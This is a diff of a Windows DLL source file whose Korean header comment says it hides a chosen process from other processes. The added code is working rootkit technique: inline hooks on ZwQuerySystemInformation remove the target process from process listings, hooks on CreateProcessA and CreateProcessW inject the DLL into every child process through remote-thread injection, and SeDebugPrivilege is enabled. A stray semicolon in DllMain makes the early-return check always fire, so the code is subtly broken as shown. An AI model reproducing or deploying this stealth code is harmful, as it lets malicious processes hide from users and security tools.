@@ -1,9 +1,17 @@
+/*****************************************************
+*	해당 프로그램(exe,dll)은 지정한 프로세스를 
+*	다른 프로세스로부터 숨긴다.(Hide)
+*****************************************************/
+
 #include "pch.h"
+#include <stdio.h>
 #include <Windows.h>
 #include <string.h>
 #include <tchar.h>
 #include <stdlib.h>
-#define STATUS_SUCCESS						(0x00000000L)
+
+#define STR_MODULE_NAME					    "DllInjection_dll.dll"
+#define STATUS_SUCCESS						(0x00000000L) 
 
 typedef LONG NTSTATUS;
 
@@ -39,18 +47,42 @@ typedef NTSTATUS(WINAPI *PFZWQUERYSYSTEMINFORMATION)
  ULONG SystemInformationLength,
  PULONG ReturnLength);
 
+typedef BOOL(WINAPI *PFCREATEPROCESSA)(
+	LPCTSTR lpApplicationName,
+	LPTSTR lpCommandLine,
+	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	BOOL bInheritHandles,
+	DWORD dwCreationFlags,
+	LPVOID lpEnvironment,
+	LPCTSTR lpCurrentDirectory,
+	LPSTARTUPINFO lpStartupInfo,
+	LPPROCESS_INFORMATION lpProcessInformation
+	);
 
-#define DEF_NTDLL                       ("ntdll.dll")
-#define DEF_ZWQUERYSYSTEMINFORMATION    ("ZwQuerySystemInformation")
+typedef BOOL(WINAPI *PFCREATEPROCESSW)(
+	LPCTSTR lpApplicationName,
+	LPTSTR lpCommandLine,
+	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	BOOL bInheritHandles,
+	DWORD dwCreationFlags,
+	LPVOID lpEnvironment,
+	LPCTSTR lpCurrentDirectory,
+	LPSTARTUPINFO lpStartupInfo,
+	LPPROCESS_INFORMATION lpProcessInformation
+	);
 
 // global variable (in sharing memory)
 #pragma comment(linker, "/SECTION:.SHARE,RWS")
 #pragma data_seg(".SHARE")
-wchar_t g_szProcName[MAX_PATH] = { 0, };
+	char g_szProcName[MAX_PATH] = { 0, };
 #pragma data_seg()
 
 // global variable
-BYTE g_pOrgBytes[5] = { 0, };
+BYTE g_pOrgCPA[5] = { 0, };
+BYTE g_pOrgCPW[5] = { 0, };
+BYTE g_pOrgZwQSI[5] = { 0, };
 
 BOOL hook_by_code(
 	const wchar_t* szDllName, 
@@ -93,7 +125,7 @@ BOOL hook_by_code(
 
 
 BOOL unhook_by_code(
-	const wchar_t* szDllName, 
+	const TCHAR* szDllName, 
 	const char* szFuncName, 
 	PBYTE pOrgBytes)
 {
@@ -115,6 +147,38 @@ BOOL unhook_by_code(
 	return TRUE;
 }
 
+bool 
+InjectDll(
+	_In_ HANDLE hProcess, 
+	_In_ LPCTSTR szDllName)
+{
+	HANDLE hThread;
+	LPVOID pRemoteBuf;
+	DWORD dwBufSize = lstrlen(szDllName) + 1;
+	FARPROC pThreadProc;
+
+	pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize,
+								MEM_COMMIT, PAGE_READWRITE);
+	if (pRemoteBuf == NULL)
+		return false;
+
+	WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName,
+					   dwBufSize, NULL);
+
+	pThreadProc = GetProcAddress(GetModuleHandle(_T("kernel32.dll")),
+								 "LoadLibraryA");
+	hThread = CreateRemoteThread(hProcess, NULL, 0,
+		(LPTHREAD_START_ROUTINE)pThreadProc,
+								 pRemoteBuf, 0, NULL);
+	WaitForSingleObject(hThread, INFINITE);
+
+	VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
+
+	CloseHandle(hThread);
+
+	return true;
+}
+
 
 NTSTATUS WINAPI NewZwQuerySystemInformation(
 	SYSTEM_INFORMATION_CLASS SystemInformationClass,
@@ -125,13 +189,13 @@ NTSTATUS WINAPI NewZwQuerySystemInformation(
 	NTSTATUS status;
 	FARPROC pFunc;
 	PSYSTEM_PROCESS_INFORMATION pCur = nullptr, pPrev = nullptr;
-	wchar_t szProcName[MAX_PATH] = { 0, };
+	char szProcName[MAX_PATH] = { 0, };
 
-	// 작업 전에 unhook
-	unhook_by_code(L"ntdll.dll", "ZwQuerySystemInformation", g_pOrgBytes);
+	unhook_by_code(_T("ntdll.dll"), 
+				   "ZwQuerySystemInformation", 
+				   g_pOrgZwQSI);
 
-	// original API 호출
-	pFunc = GetProcAddress(GetModuleHandle(L"ntdll.dll"),
+	pFunc = GetProcAddress(GetModuleHandle(_T("ntdll.dll")),
 						   "ZwQuerySystemInformation");
 	status = ((PFZWQUERYSYSTEMINFORMATION)pFunc)
 		(SystemInformationClass, SystemInformation,
@@ -140,53 +204,183 @@ NTSTATUS WINAPI NewZwQuerySystemInformation(
 	if (status != STATUS_SUCCESS)
 		goto __NTQUERYSYSTEMINFORMATION_END;
 
-	// SystemProcessInformation 인 경우만 작업함
 	if (SystemInformationClass == SystemProcessInformation)
 	{
-		// SYSTEM_PROCESS_INFORMATION 타입 캐스팅
-		// pCur 는 single linked list 의 head
 		pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
 
 		while (TRUE)
 		{
-			// wide character => multi byte 변환
-			//WideCharToMultiByte(CP_ACP, 0, (PWSTR)pCur->Reserved2[1],
-			//					-1, szProcName, MAX_PATH, NULL, NULL);
+			WideCharToMultiByte(CP_ACP, 0, (PWSTR)pCur->Reserved2[1], -1,
+								szProcName, MAX_PATH, NULL, NULL);
 
-			// 프로세스 이름 비교
-			// g_szProcName = 은폐하려는 프로세스 이름
-			// (=> SetProcName() 에서 세팅됨)
-			if (!_tcsicmp((wchar_t*)pCur->Reserved2[1], g_szProcName))
+			if (!_strcmpi(szProcName, g_szProcName))
 			{
-				// 연결 리스트에서 은폐 프로세스 제거
 				if (pCur->NextEntryOffset == 0)
-				{
 					pPrev->NextEntryOffset = 0;
-				}
 				else
-				{
 					pPrev->NextEntryOffset += pCur->NextEntryOffset;
-				}
 			}
 			else
-				pPrev = pCur;
+				pPrev = pCur;	// 원하는 프로세스를 못 찾은 경우만 pPrev 세팅
 
 			if (pCur->NextEntryOffset == 0)
 				break;
 
-			// 연결 리스트의 다음 항목
-			pCur = (PSYSTEM_PROCESS_INFORMATION)
-				((ULONG)pCur + pCur->NextEntryOffset);
+			pCur = (PSYSTEM_PROCESS_INFORMATION)((ULONG)pCur + pCur->NextEntryOffset);
 		}
 	}
 
 __NTQUERYSYSTEMINFORMATION_END:
 
-	// 함수 종료 전에 다시 API Hooking
-	hook_by_code(L"ntdll.dll", "ZwQuerySystemInformation",
-		(PROC)NewZwQuerySystemInformation, g_pOrgBytes);
+	hook_by_code(_T("ntdll.dll"), 
+				 "ZwQuerySystemInformation",
+				 (PROC)NewZwQuerySystemInformation, 
+				 g_pOrgZwQSI);
 
 	return status;
+}
+
+BOOL WINAPI NewCreateProcessA(
+	LPCTSTR lpApplicationName,
+	LPTSTR lpCommandLine,
+	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	BOOL bInheritHandles,
+	DWORD dwCreationFlags,
+	LPVOID lpEnvironment,
+	LPCTSTR lpCurrentDirectory,
+	LPSTARTUPINFO lpStartupInfo,
+	LPPROCESS_INFORMATION lpProcessInformation
+)
+{
+	BOOL bRet;
+	FARPROC pFunc;
+
+	// unhook
+	unhook_by_code(_T("kernel32.dll"), 
+				   "CreateProcessA", 
+				   g_pOrgCPA);
+
+	// original API 호출
+	pFunc = GetProcAddress(GetModuleHandle(_T("kernel32.dll")), "CreateProcessA");
+	bRet = ((PFCREATEPROCESSA)pFunc)(lpApplicationName,
+									 lpCommandLine,
+									 lpProcessAttributes,
+									 lpThreadAttributes,
+									 bInheritHandles,
+									 dwCreationFlags,
+									 lpEnvironment,
+									 lpCurrentDirectory,
+									 lpStartupInfo,
+									 lpProcessInformation);
+
+	// 생성된 자식 프로세스에 stealth2.dll 을 인젝션 시킴
+	if (bRet)
+		InjectDll(lpProcessInformation->hProcess, _T(STR_MODULE_NAME));
+
+	// hook
+	hook_by_code(_T("kernel32.dll"), 
+				 "CreateProcessA",
+				 (PROC)NewCreateProcessA, 
+				 g_pOrgCPA);
+
+	return bRet;
+}
+
+BOOL WINAPI NewCreateProcessW(
+	LPCTSTR lpApplicationName,
+	LPTSTR lpCommandLine,
+	LPSECURITY_ATTRIBUTES lpProcessAttributes,
+	LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	BOOL bInheritHandles,
+	DWORD dwCreationFlags,
+	LPVOID lpEnvironment,
+	LPCTSTR lpCurrentDirectory,
+	LPSTARTUPINFO lpStartupInfo,
+	LPPROCESS_INFORMATION lpProcessInformation
+)
+{
+	BOOL bRet;
+	FARPROC pFunc;
+
+	// unhook
+	unhook_by_code(_T("kernel32.dll"), "CreateProcessW", g_pOrgCPW);
+
+	// original API 호출
+	pFunc = GetProcAddress(GetModuleHandle(_T("kernel32.dll")), "CreateProcessW");
+	bRet = ((PFCREATEPROCESSW)pFunc)(lpApplicationName,
+									 lpCommandLine,
+									 lpProcessAttributes,
+									 lpThreadAttributes,
+									 bInheritHandles,
+									 dwCreationFlags,
+									 lpEnvironment,
+									 lpCurrentDirectory,
+									 lpStartupInfo,
+									 lpProcessInformation);
+
+	if (bRet)
+		InjectDll(lpProcessInformation->hProcess, _T(STR_MODULE_NAME));
+
+	// hook
+	hook_by_code(_T("kernel32.dll"), 
+				 "CreateProcessW",
+				 (PROC)NewCreateProcessW, 
+				 g_pOrgCPW);
+
+	return bRet;
+}
+
+bool SetPrivilege(
+	_In_ LPCTSTR lpszPrivilege, 
+	_In_ bool bEnablePrivilege)
+{
+	TOKEN_PRIVILEGES tp;
+	HANDLE hToken;
+	LUID luid;
+
+	if (!OpenProcessToken(GetCurrentProcess(),
+						  TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+						  &hToken))
+	{
+		printf("OpenProcessToken error: %u\n", GetLastError());
+		return FALSE;
+	}
+
+	if (!LookupPrivilegeValue(NULL,             // lookup privilege on local system
+							  lpszPrivilege,    // privilege to lookup 
+							  &luid))          // receives LUID of privilege
+	{
+		printf("LookupPrivilegeValue error: %u\n", GetLastError());
+		return FALSE;
+	}
+
+	tp.PrivilegeCount = 1;
+	tp.Privileges[0].Luid = luid;
+	if (bEnablePrivilege)
+		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+	else
+		tp.Privileges[0].Attributes = 0;
+
+	// Enable the privilege or disable all privileges.
+	if (!AdjustTokenPrivileges(hToken,
+							   FALSE,
+							   &tp,
+							   sizeof(TOKEN_PRIVILEGES),
+							   (PTOKEN_PRIVILEGES)NULL,
+							   (PDWORD)NULL))
+	{
+		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
+		return FALSE;
+	}
+
+	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
+	{
+		printf("The token does not have the specified privilege. \n");
+		return FALSE;
+	}
+
+	return TRUE;
 }
 
 BOOL
@@ -195,8 +389,8 @@ APIENTRY DllMain(HMODULE hModule,
 				 LPVOID lpReserved
 )
 {
-	wchar_t current_proc[MAX_PATH] = { 0, };
-	wchar_t* p = nullptr;
+	TCHAR current_proc[MAX_PATH] = { 0, };
+	TCHAR* p = nullptr;
 
 	GetModuleFileName(nullptr, current_proc, MAX_PATH);
 	p = _tcsrchr(current_proc, _T('\\'));
@@ -204,21 +398,43 @@ APIENTRY DllMain(HMODULE hModule,
 	if (p != nullptr)
 	{
 		// DllInjection_injector
-		if (!_tcsicmp(p + 1, _T("DllInjection_injector.exe")));
+		if (0 == _tcsicmp(p + 1, _T("HideTargetProcess.exe")));
 		{
 			return TRUE;
 		}
 	}
 
+	SetPrivilege(SE_DEBUG_NAME, true);
+
     switch (ul_reason_for_call)
     {
     case DLL_PROCESS_ATTACH:
-		hook_by_code(L"ntdll.dll", "ZwQuerySystemInformation", (PROC)NewZwQuerySystemInformation, g_pOrgBytes);
+		hook_by_code(_T("kernel32.dll"), 
+					 "CreateProcessA",
+					 (PROC)NewCreateProcessA, 
+					 g_pOrgCPA);
+
+		hook_by_code(_T("kernel32.dll"), 
+					 "CreateProcessW",
+					 (PROC)NewCreateProcessW, 
+					 g_pOrgCPW);
+
+		hook_by_code(_T("ntdll.dll"), 
+					 "ZwQuerySystemInformation",
+					 (PROC)NewZwQuerySystemInformation, 
+					 g_pOrgZwQSI);
 		break;
-    case DLL_THREAD_ATTACH:
-    case DLL_THREAD_DETACH:
     case DLL_PROCESS_DETACH:
-		unhook_by_code(L"ntdll.dll", "ZwQuerySystemInformation", g_pOrgBytes);
+		unhook_by_code(_T("kernel32.dll"), 
+					   "CreateProcessA",
+					   g_pOrgCPA);
+
+		unhook_by_code(_T("kernel32.dll"), 
+					   "CreateProcessW",
+					   g_pOrgCPW);
+		unhook_by_code(_T("ntdll.dll"), 
+					   "ZwQuerySystemInformation",
+					   g_pOrgZwQSI);
         break;
     }
     return TRUE;
@@ -227,9 +443,9 @@ APIENTRY DllMain(HMODULE hModule,
 #ifdef __cplusplus
 extern "C" {
 #endif
-	__declspec(dllexport) void SetProcName(const wchar_t* szProcName)
+	__declspec(dllexport) void SetProcName(const char* szProcName)
 	{
-		_tcscpy_s(g_szProcName, _countof(g_szProcName),szProcName);
+		strcpy_s(g_szProcName, _countof(g_szProcName),szProcName);
 	}
 #ifdef __cplusplus
 }
